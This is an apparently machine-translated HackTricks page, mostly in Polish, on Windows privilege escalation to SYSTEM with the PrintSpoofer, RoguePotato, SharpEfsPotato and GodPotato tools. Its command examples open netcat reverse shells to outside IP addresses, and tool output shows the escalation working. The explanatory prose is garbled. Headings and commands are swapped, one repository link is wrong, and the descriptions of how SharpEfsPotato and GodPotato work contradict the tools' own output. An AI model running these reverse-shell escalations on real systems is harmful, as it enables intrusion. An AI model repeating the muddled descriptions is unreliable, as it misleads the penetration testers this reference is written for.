# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

{% hint style="warning" %}
**JuicyPotato nie działa** na Windows Server 2019 i Windows 10 w wersji 1809 i nowszych. Jednak [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato) można użyć do **wykorzystania tych samych uprawnień i uzyskania dostępu na poziomie `NT AUTHORITY\SYSTEM`**. Wpis na [blogu](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) przedstawia szczegółowo narzędzie `PrintSpoofer`, które można wykorzystać do nadużywania uprawnień impersonacji na hostach Windows 10 i Server 2019, gdzie JuicyPotato już nie działa.
{% endhint %}

## Szybka prezentacja

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
RoguePotato to narzędzie, które wykorzystuje podatność w usłudze DCOM (Distributed Component Object Model) w systemach Windows w celu eskalacji uprawnień lokalnych. Działa na zasadzie ataku typu "reflection" (odbicie), wykorzystując błąd w mechanizmie autoryzacji usługi DCOM.

Atakujący musi mieć uprawnienia do uruchomienia kodu na komputerze docelowym. RoguePotato wykorzystuje tę możliwość, aby uruchomić złośliwy serwer RPC (Remote Procedure Call) na komputerze docelowym. Następnie atakujący wysyła żądanie do serwera RPC, które wywołuje usługę DCOM i wykorzystuje błąd w mechanizmie autoryzacji, aby uzyskać uprawnienia SYSTEM.

RoguePotato jest szczególnie skuteczny w przypadku, gdy na komputerze docelowym działa usługa "Print Spooler" (usługa drukowania). W takim przypadku atakujący może wykorzystać narzędzie PrintSpoofer (opisane poniżej) do uruchomienia kodu z uprawnieniami SYSTEM.

### PrintSpoofer

PrintSpoofer to narzędzie, które wykorzystuje podatność w usłudze "Print Spooler" w systemach Windows w celu eskalacji uprawnień lokalnych. Działa na zasadzie ataku typu "reflection" (odbicie), wykorzystując błąd w mechanizmie autoryzacji usługi "Print Spooler".

Atakujący musi mieć uprawnienia do uruchomienia kodu na komputerze docelowym. PrintSpoofer wykorzystuje tę możliwość, aby uruchomić złośliwy serwer RPC (Remote Procedure Call) na komputerze docelowym. Następnie atakujący wysyła żądanie do serwera RPC, które wywołuje usługę "Print Spooler" i wykorzystuje błąd w mechanizmie autoryzacji, aby uzyskać uprawnienia SYSTEM.

PrintSpoofer jest szczególnie skuteczny w przypadku, gdy na komputerze docelowym działa usługa "Print Spooler". Atakujący może wykorzystać tę podatność do uruchomienia kodu z uprawnieniami SYSTEM.
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
{% code %}

### SharpEfsPotato

SharpEfsPotato is a tool that exploits the EFS (Encrypting File System) service to achieve local privilege escalation on Windows systems. It leverages the "Rogue Potato" technique, which takes advantage of the Windows Print Spooler service to execute arbitrary code with SYSTEM privileges.

To use SharpEfsPotato, follow these steps:

1. Download the tool from the [GitHub repository](https://github.com/itm4n/SharpEfsPotato).
2. Compile the source code using Visual Studio or use the precompiled binary.
3. Transfer the executable to the target Windows machine.
4. Execute the tool with administrative privileges.

Once executed, SharpEfsPotato will create a rogue print spooler service that impersonates the legitimate Print Spooler service. It then triggers the EFS service to execute a DLL file with SYSTEM privileges. This DLL file can be replaced with a malicious payload to achieve privilege escalation.

SharpEfsPotato is a powerful tool that can bypass security measures and gain elevated privileges on Windows systems. However, it should only be used for ethical purposes, such as penetration testing or authorized security assessments.

{% endcode %}
```
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### GodPotato

GodPotato to narzędzie, które wykorzystuje podatność w usłudze Windows Print Spooler, aby uzyskać podwyższenie uprawnień lokalnych na systemie. Wykorzystuje ona technikę znana jako "PrintSpoofer", która pozwala na wykonanie arbitralnego kodu z uprawnieniami SYSTEM.

Aby użyć GodPotato, należy najpierw uruchomić narzędzie PrintSpoofer, które umożliwia manipulację usługą Windows Print Spooler. Następnie, przy użyciu GodPotato, można wykorzystać tę manipulację, aby uzyskać podwyższenie uprawnień do konta SYSTEM.

GodPotato jest szczególnie przydatne w przypadku, gdy użytkownik ma uprawnienia do uruchamiania poleceń jako lokalny administrator, ale nie ma uprawnień do konta SYSTEM. Dzięki temu narzędziu można uzyskać pełną kontrolę nad systemem, wykonując kod z uprawnieniami SYSTEM.

Należy jednak pamiętać, że GodPotato jest narzędziem potencjalnie niebezpiecznym i powinno być używane tylko w celach legalnych i zgodnych z prawem.
```
GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
## Odnośniki
* [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
* [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
* [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
* [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
* [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
